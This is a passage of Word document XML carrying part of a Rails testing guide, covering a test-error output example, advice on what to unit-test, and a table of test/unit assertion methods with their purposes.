          <w:p w14:paraId="519A18D6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Finished in 0.082603 seconds.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FB7A921" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63E0133B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  1) Error:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="264E99C6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_should_report_error(PostTest):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="306E0484" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>NameError: undefined local variable or method `some_undefined_variable' for #&lt;PostTest:0x249d354&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07B00FA7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    /test/unit/post_test.rb:6:in `test_should_report_error'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08552907" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46139D3A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1 tests, 0 assertions, 0 failures, 1 errors</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4735CA2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Notice the ‘E’ in the output. It denotes a test with error.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7599C7AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The execution of each test method stops as soon as any error or an assertion failure is encountered, and the test suite continues with the next method. All test methods are executed in alphabetical order.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278E6C47" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 What to Include in Your Unit Tests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DDCA242" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Ideally, you would like to include a test for everything which could possibly break. It’s a good practice to have at least one test for each of your validations and at least one test for every method in your model.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="344975E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 Assertions Available</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013BD930" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>By now you’ve caught a glimpse of some of the assertions that are available. Assertions are the worker bees of testing. They are the ones that actually perform the checks to ensure that things are going as planned.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7007AC80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There are a bunch of different types of assertions you can use. Here’s the complete list of assertions that ship with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/unit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the default testing library used by Rails. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>[msg]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> parameter is an optional string message you can specify to make your test failure messages clearer. It’s not required.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1"/>
        <w:gridCol w:w="3805"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="76D224E7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71718ED4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">Assertion </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C8148C9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="6960AAEB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="76DEA29B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert( boolean, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="56111BB4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Ensures that the object/expression is true.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="5D03D646" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C89F41B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_equal( obj1, obj2, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="13667785" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ensures that </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>obj1 == obj2</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> is true.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="0C20E214" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="774014AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_not_equal( obj1, obj2, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7065CAC5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ensures that </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>obj1 == obj2</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> is false.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="7EE144ED" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="648DCC24" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_same( obj1, obj2, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2EDD67BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ensures that </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>obj1.equal?(obj2)</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> is true.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="3AEFF1A7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="231E29B1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_not_same( obj1, obj2, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="57322CDD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ensures that </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>obj1.equal?(obj2)</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> is false.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="3D1FA989" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22166591" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_nil( obj, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5043339B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ensures that </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>obj.nil?</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> is true.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="5A8F1A46" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02B7B9A6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_not_nil( obj, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D59D6B7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ensures that </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>obj.nil?</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> is false.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="42B7290C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3EEFE092" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_match( regexp, string, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="13872585" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Ensures that a string matches the regular expression.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="7F493DC8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="07AE8103" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_no_match( regexp, string, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C9806C9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Ensures that a string doesn’t match the regular expression.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="4182BBF2" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="37D43005" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_in_delta( expecting, actual, delta, [msg] )</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62430E26" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Ensures that the numbers </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>expecting</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> and </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>actual</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> are within </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>delta</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> of each other.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="28A442FF" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F70FB38" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_throws( symbol, [msg] ) { block }</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C62780C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Ensures that the given block throws the symbol.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="6D175792" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40AAF3EC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_raise( exception1, exception2, ... ) { block }</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="795C82EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Ensures that the given block raises one of the given exceptions.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="501874FB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="338772F4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>assert_nothing_raised( exception1, exception2, ... ) { block }</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
